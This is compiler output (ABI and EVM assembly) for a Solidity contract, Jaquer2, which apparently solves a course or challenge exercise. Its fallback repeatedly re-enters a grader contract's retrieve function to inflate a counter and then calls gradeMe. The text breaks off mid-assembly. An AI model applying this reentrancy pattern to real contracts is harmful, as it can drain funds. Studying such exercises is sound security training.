{
	"jaquer2.sol": {
		"Jaquer2": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "graderAddress",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "name",
							"type": "string"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "grader",
					"outputs": [
						{
							"internalType": "contract IGrader5",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "retrieveCount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "targetName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"jaquer2.sol\":249:1575  contract Jaquer2 {... */\n  mstore(0x40, 0x80)\n    /* \"jaquer2.sol\":374:468  constructor(address graderAddress) payable {... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"jaquer2.sol\":446:459  graderAddress */\n  dup1\n    /* \"jaquer2.sol\":428:434  grader */\n  0x00\n  0x00\n    /* \"jaquer2.sol\":428:460  grader = IGrader5(graderAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"jaquer2.sol\":374:468  constructor(address graderAddress) payable {... */\n  pop\n    /* \"jaquer2.sol\":249:1575  contract Jaquer2 {... */\n  jump(tag_5)\n    /* \"#utility.yul\":88:205   */\ntag_7:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_9:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_10:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_19\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_9\n  jump\t// in\ntag_19:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_11:\n    /* \"#utility.yul\":641:665   */\n  tag_21\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_22:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_12:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_24\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_11\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_2:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_26\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_27\n  tag_7\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":932:1051   */\ntag_26:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_28\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_12\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"jaquer2.sol\":249:1575  contract Jaquer2 {... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"jaquer2.sol\":249:1575  contract Jaquer2 {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3ccfd60b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x5bc05526\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xaabb7554\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xf2ceb75f\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xfdfd5917\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"jaquer2.sol\":955:968  retrieveCount */\n      0x02\n      0x00\n        /* \"jaquer2.sol\":955:970  retrieveCount++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_12\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"jaquer2.sol\":1083:1084  1 */\n      0x01\n        /* \"jaquer2.sol\":1051:1057  grader */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"jaquer2.sol\":1051:1065  grader.counter */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc12327b8\n        /* \"jaquer2.sol\":1074:1078  this */\n      address\n        /* \"jaquer2.sol\":1051:1080  grader.counter(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n        /* \"jaquer2.sol\":1051:1084  grader.counter(address(this)) > 1 */\n      gt\n        /* \"jaquer2.sol\":1047:1408  if (grader.counter(address(this)) > 1) {... */\n      iszero\n      tag_20\n      jumpi\n        /* \"jaquer2.sol\":1163:1169  grader */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"jaquer2.sol\":1163:1177  grader.gradeMe */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d86b167\n        /* \"jaquer2.sol\":1178:1188  targetName */\n      0x01\n        /* \"jaquer2.sol\":1163:1189  grader.gradeMe(targetName) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      revert(0x00, 0x00)\n    tag_23:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n        /* \"jaquer2.sol\":1047:1408  if (grader.counter(address(this)) > 1) {... */\n      jump(tag_26)\n    tag_20:\n        /* \"jaquer2.sol\":1294:1295  3 */\n      0x03\n        /* \"jaquer2.sol\":1278:1291  retrieveCount */\n      sload(0x02)\n        /* \"jaquer2.sol\":1278:1295  retrieveCount < 3 */\n      lt\n        /* \"jaquer2.sol\":1274:1397  if (retrieveCount < 3) { // Prevención contra loops infinitos... */\n      iszero\n      tag_27\n      jumpi\n        /* \"jaquer2.sol\":1354:1360  grader */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"jaquer2.sol\":1354:1369  grader.retrieve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e64cec1\n        /* \"jaquer2.sol\":1377:1378  4 */\n      0x04\n        /* \"jaquer2.sol\":1354:1381  grader.retrieve{value: 4}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      revert(0x00, 0x00)\n    tag_28:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"jaquer2.sol\":1274:1397  if (retrieveCount < 3) { // Prevención contra loops infinitos... */\n    tag_27:\n        /* \"jaquer2.sol\":1047:1408  if (grader.counter(address(this)) > 1) {... */\n    tag_26:\n        /* \"jaquer2.sol\":249:1575  contract Jaquer2 {... */\n      stop\n        /* \"jaquer2.sol\":1473:1572  function withdraw() external {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_31\n      jumpi\n      revert(0x00, 0x00)\n    tag_31:\n      pop\n      tag_32\n      tag_33\n      jump\t// in\n    tag_32:\n      stop\n        /* \"jaquer2.sol\":273:295  IGrader5 public grader */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_34\n      jumpi\n      revert(0x00, 0x00)\n    tag_34:\n      pop\n      tag_35\n      tag_36\n      jump\t// in\n    tag_35:\n      mload(0x40)\n      tag_37\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_37:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"jaquer2.sol\":480:779  function attack(string calldata name) external payable {... */\n    tag_5:\n      tag_39\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_40\n      swap2\n      swap1\n      tag_41\n      jump\t// in\n    tag_40:\n      tag_42\n      jump\t// in\n    tag_39:\n      stop\n        /* \"jaquer2.sol\":333:361  uint256 public retrieveCount */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_43\n      jumpi\n      revert(0x00, 0x00)\n    tag_43:\n      pop\n      tag_44\n      tag_45\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      tag_46\n      swap2\n      swap1\n      tag_47\n      jump\t// in\n    tag_46:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"jaquer2.sol\":302:326  string public targetName */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_48\n      jumpi\n      revert(0x00, 0x00)\n    tag_48:\n      pop\n      tag_49\n      tag_50\n      jump\t// in\n    tag_49:\n      mload(0x40)\n      tag_51\n      swap2\n      swap1\n      tag_52\n      jump\t// in\n    tag_51:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"jaquer2.sol\":1473:1572  function withdraw() external {... */\n    tag_33:\n        /* \"jaquer2.sol\":1521:1531  msg.sender */\n      caller\n        /* \"jaquer2.sol\":1513:1541  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"jaquer2.sol\":1513:1564  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"jaquer2.sol\":1542:1563  address(this).balance */\n      selfbalance\n        /* \"jaquer2.sol\":1513:1564  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_55\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_55:\n      pop\n        /* \"jaquer2.sol\":1473:1572  function withdraw() external {... */\n      jump\t// out\n        /* \"jaquer2.sol\":273:295  IGrader5 public grader */\n    tag_36:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"jaquer2.sol\":480:779  function attack(string calldata name) external payable {... */\n    tag_42:\n        /* \"jaquer2.sol\":632:636  name */\n      dup2\n      dup2\n        /* \"jaquer2.sol\":619:629  targetName */\n      0x01\n        /* \"jaquer2.sol\":619:636  targetName = name */\n      swap2\n      dup3\n      tag_57\n      swap3\n      swap2\n      swap1\n      tag_58\n      jump\t// in\n    tag_57:\n      pop\n        /* \"jaquer2.sol\":663:664  0 */\n      0x00\n        /* \"jaquer2.sol\":647:660  retrieveCount */\n      0x02\n        /* \"jaquer2.sol\":647:664  retrieveCount = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"jaquer2.sol\":744:750  grader */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"jaquer2.sol\":744:759  grader.retrieve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e64cec1\n        /* \"jaquer2.sol\":767:768  4 */\n      0x04\n        /* \"jaquer2.sol\":744:771  grader.retrieve{value: 4}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      revert(0x00, 0x00)\n    tag_59:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_61\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_61:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"jaquer2.sol\":480:779  function attack(string calldata name) external payable {... */\n      pop\n      pop\n      jump\t// out\n        /* \"jaquer2.sol\":333:361  uint256 public retrieveCount */\n    tag_45:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"jaquer2.sol\":302:326  string public targetName */\n    tag_50:\n      0x01\n      dup1\n      sload\n      tag_62\n      swap1\n      tag_63\n      jump\t// in\n    tag_62:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_64\n      swap1\n      tag_63\n      jump\t// in\n    tag_64:\n      dup1\n      iszero\n      tag_65\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_66\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_65)\n    tag_66:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_67:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_67\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_65:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:187   */\n    tag_68:\n        /* \"#utility.yul\":55:132   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":52:53   */\n      0x00\n        /* \"#utility.yul\":45:133   */\n      mstore\n        /* \"#utility.yul\":152:156   */\n      0x11\n        /* \"#utility.yul\":149:150   */\n      0x04\n        /* \"#utility.yul\":142:157   */\n      mstore\n        /* \"#utility.yul\":176:180   */\n      0x24\n        /* \"#utility.yul\":173:174   */\n      0x00\n        /* \"#utility.yul\":166:181   */\n      revert\n        /* \"#utility.yul\":193:270   */\n    tag_69:\n        /* \"#utility.yul\":230:237   */\n      0x00\n        /* \"#utility.yul\":259:264   */\n      dup2\n        /* \"#utility.yul\":248:264   */\n      swap1\n      pop\n        /* \"#utility.yul\":193:270   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":276:509   */\n    tag_13:\n        /* \"#utility.yul\":315:318   */\n      0x00\n        /* \"#utility.yul\":338:362   */\n      tag_115\n        /* \"#utility.yul\":356:361   */\n      dup3\n        /* \"#utility.yul\":338:362   */\n      tag_69\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":329:362   */\n      swap2\n      pop\n        /* \"#utility.yul\":384:450   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":377:382   */\n      dup3\n        /* \"#utility.yul\":374:451   */\n      sub\n        /* \"#utility.yul\":371:474   */\n      tag_116\n      jumpi\n        /* \"#utility.yul\":454:472   */\n      tag_117\n      tag_68\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":371:474   */\n    tag_116:\n        /* \"#utility.yul\":501:502   */\n      0x01\n        /* \"#utility.yul\":494:499   */\n      dup3\n        /* \"#utility.yul\":490:503   */\n      add\n        /* \"#utility.yul\":483:503   */\n      swap1\n      pop\n        /* \"#utility.yul\":276:509   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":515:641   */\n    tag_70:\n        /* \"#utility.yul\":552:559   */\n      0x00\n        /* \"#utility.yul\":592:634   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":585:590   */\n      dup3\n        /* \"#utility.yul\":581:635   */\n      and\n        /* \"#utility.yul\":570:635   */\n      swap1\n      pop\n        /* \"#utility.yul\":515:641   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":647:743   */\n    tag_71:\n        /* \"#utility.yul\":684:691   */\n      0x00\n        /* \"#utility.yul\":713:737   */\n      tag_120\n        /* \"#utility.yul\":731:736   */\n      dup3\n        /* \"#utility.yul\":713:737   */\n      tag_70\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":702:737   */\n      swap1\n      pop\n        /* \"#utility.yul\":647:743   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":749:867   */\n    tag_72:\n        /* \"#utility.yul\":836:860   */\n      tag_122\n        /* \"#utility.yul\":854:859   */\n      dup2\n        /* \"#utility.yul\":836:860   */\n      tag_71\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":831:834   */\n      dup3\n        /* \"#utility.yul\":824:861   */\n      mstore\n        /* \"#utility.yul\":749:867   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":873:1095   */\n    tag_15:\n        /* \"#utility.yul\":966:970   */\n      0x00\n        /* \"#utility.yul\":1004:1006   */\n      0x20\n        /* \"#utility.yul\":993:1002   */\n      dup3\n        /* \"#utility.yul\":989:1007   */\n      add\n        /* \"#utility.yul\":981:1007   */\n      swap1\n      pop\n        /* \"#utility.yul\":1017:1088   */\n      tag_124\n        /* \"#utility.yul\":1085:1086   */\n      0x00\n        /* \"#utility.yul\":1074:1083   */\n      dup4\n        /* \"#utility.yul\":1070:1087   */\n      add\n        /* \"#utility.yul\":1061:1067   */\n      dup5\n        /* \"#utility.yul\":1017:1088   */\n      tag_72\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":873:1095   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1182:1299   */\n    tag_74:\n        /* \"#utility.yul\":1291:1292   */\n      0x00\n        /* \"#utility.yul\":1288:1289   */\n      0x00\n        /* \"#utility.yul\":1281:1293   */\n      revert\n        /* \"#utility.yul\":1305:1422   */\n    tag_75:\n        /* \"#utility.yul\":1414:1415   */\n      0x00\n        /* \"#utility.yul\":1411:1412   */\n      0x00\n        /* \"#utility.yul\":1404:1416   */\n      revert\n        /* \"#utility.yul\":1428:1550   */\n    tag_76:\n        /* \"#utility.yul\":1501:1525   */\n      tag_129\n        /* \"#utility.yul\":1519:1524   */\n      dup2\n        /* \"#utility.yul\":1501:1525   */\n      tag_69\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":1494:1499   */\n      dup2\n        /* \"#utility.yul\":1491:1526   */\n      eq\n        /* \"#utility.yul\":1481:1544   */\n      tag_130\n      jumpi\n        /* \"#utility.yul\":1540:1541   */\n      0x00\n        /* \"#utility.yul\":1537:1538   */\n      0x00\n        /* \"#utility.yul\":1530:1542   */\n      revert\n        /* \"#utility.yul\":1481:1544   */\n    tag_130:\n        /* \"#utility.yul\":1428:1550   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1556:1699   */\n    tag_77:\n        /* \"#utility.yul\":1613:1618   */\n      0x00\n        /* \"#utility.yul\":1644:1650   */\n      dup2\n        /* \"#utility.yul\":1638:1651   */\n      mload\n        /* \"#utility.yul\":1629:1651   */\n      swap1\n      pop\n        /* \"#utility.yul\":1660:1693   */\n      tag_132\n        /* \"#utility.yul\":1687:1692   */\n      dup2\n        /* \"#utility.yul\":1660:1693   */\n      tag_76\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":1556:1699   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1705:2056   */\n    tag_19:\n        /* \"#utility.yul\":1775:1781   */\n      0x00\n        /* \"#utility.yul\":1824:1826   */\n      0x20\n        /* \"#utility.yul\":1812:1821   */\n      dup3\n        /* \"#utility.yul\":1803:1810   */\n      dup5\n        /* \"#utility.yul\":1799:1822   */\n      sub\n        /* \"#utility.yul\":1795:1827   */\n      slt\n        /* \"#utility.yul\":1792:1911   */\n      iszero\n      tag_134\n      jumpi\n        /* \"#utility.yul\":1830:1909   */\n      tag_135\n      tag_74\n      jump\t// in\n    tag_135:\n        /* \"#utility.yul\":1792:1911   */\n    tag_134:\n        /* \"#utility.yul\":1950:1951   */\n      0x00\n        /* \"#utility.yul\":1975:2039   */\n      tag_136\n        /* \"#utility.yul\":2031:2038   */\n      dup5\n        /* \"#utility.yul\":2022:2028   */\n      dup3\n        /* \"#utility.yul\":2011:2020   */\n      dup6\n        /* \"#utility.yul\":2007:2029   */\n      add\n        /* \"#utility.yul\":1975:2039   */\n      tag_77\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":1965:2039   */\n      swap2\n      pop\n        /* \"#utility.yul\":1921:2049   */\n      pop\n        /* \"#utility.yul\":1705:2056   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2062:2242   */\n    tag_78:\n        /* \"#utility.yul\":2110:2187   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2107:2108   */\n      0x00\n        /* \"#utility.yul\":2100:2188   */\n      mstore\n        /* \"#utility.yul\":2207:2211   */\n      0x22\n        /* \"#utility.yul\":2204:2205   */\n      0x04\n        /* \"#utility.yul\":2197:2212   */\n      mstore\n        /* \"#utility.yul\":2231:2235   */\n      0x24\n        /* \"#utility.yul\":2228:2229   */\n      0x00\n        /* \"#utility.yul\":2221:2236   */\n      revert\n        /* \"#utility.yul\":2248:2568   */\n    tag_63:\n        /* \"#utility.yul\":2292:2298   */\n      0x00\n        /* \"#utility.yul\":2329:2330   */\n      0x02\n        /* \"#utility.yul\":2323:2327   */\n      dup3\n        /* \"#utility.yul\":2319:2331   */\n      div\n        /* \"#utility.yul\":2309:2331   */\n      swap1\n      pop\n        /* \"#utility.yul\":2376:2377   */\n      0x01\n        /* \"#utility.yul\":2370:2374   */\n      dup3\n        /* \"#utility.yul\":2366:2378   */\n      and\n        /* \"#utility.yul\":2397:2415   */\n      dup1\n        /* \"#utility.yul\":2387:2468   */\n      tag_139\n      jumpi\n        /* \"#utility.yul\":2453:2457   */\n      0x7f\n        /* \"#utility.yul\":2445:2451   */\n      dup3\n        /* \"#utility.yul\":2441:2458   */\n      and\n        /* \"#utility.yul\":2431:2458   */\n      swap2\n      pop\n        /* \"#utility.yul\":2387:2468   */\n    tag_139:\n        /* \"#utility.yul\":2515:2517   */\n      0x20\n        /* \"#utility.yul\":2507:2513   */\n      dup3\n        /* \"#utility.yul\":2504:2518   */\n      lt\n        /* \"#utility.yul\":2484:2502   */\n      dup2\n        /* \"#utility.yul\":2481:2519   */\n      sub\n        /* \"#utility.yul\":2478:2562   */\n      tag_140\n      jumpi\n        /* \"#utility.yul\":2534:2552   */\n      tag_141\n      tag_78\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":2478:2562   */\n    tag_140:\n        /* \"#utility.yul\":2299:2568   */\n      pop\n        /* \"#utility.yul\":2248:2568   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2574:2743   */\n    tag_79:\n        /* \"#utility.yul\":2658:2669   */\n      0x00\n        /* \"#utility.yul\":2692:2698   */\n      dup3\n        /* \"#utility.yul\":2687:2690   */\n      dup3\n        /* \"#utility.yul\":2680:2699   */\n      mstore\n        /* \"#utility.yul\":2732:2736   */\n      0x20\n        /* \"#utility.yul\":2727:2730   */\n      dup3\n        /* \"#utility.yul\":2723:2737   */\n      add\n        /* \"#utility.yul\":2708:2737   */\n      swap1\n      pop\n        /* \"#utility.yul\":2574:2743   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2749:2890   */\n    tag_80:\n        /* \"#utility.yul\":2798:2802   */\n      0x00\n        /* \"#utility.yul\":2821:2824   */\n      dup2\n        /* \"#utility.yul\":2813:2824   */\n      swap1\n      pop\n        /* \"#utility.yul\":2844:2847   */\n      dup2\n        /* \"#utility.yul\":2841:2842   */\n      0x00\n        /* \"#utility.yul\":2834:2848   */\n      mstore\n        /* \"#utility.yul\":2878:2882   */\n      0x20\n        /* \"#utility.yul\":2875:2876   */\n      0x00\n        /* \"#utility.yul\":2865:2883   */\n      keccak256\n        /* \"#utility.yul\":2857:2883   */\n      swap1\n      pop\n        /* \"#utility.yul\":2749:2890   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2920:3751   */\n    tag_81:\n        /* \"#utility.yul\":3005:3008   */\n      0x00\n        /* \"#utility.yul\":3042:3047   */\n      dup2\n        /* \"#utility.yul\":3036:3048   */\n      sload\n        /* \"#utility.yul\":3071:3107   */\n      tag_145\n        /* \"#utility.yul\":3097:3106   */\n      dup2\n        /* \"#utility.yul\":3071:3107   */\n      tag_63\n      jump\t// in\n    tag_145:\n        /* \"#utility.yul\":3123:3194   */\n      tag_146\n        /* \"#utility.yul\":3187:3193   */\n      dup2\n        /* \"#utility.yul\":3182:3185   */\n      dup7\n        /* \"#utility.yul\":3123:3194   */\n      tag_79\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":3116:3194   */\n      swap5\n      pop\n        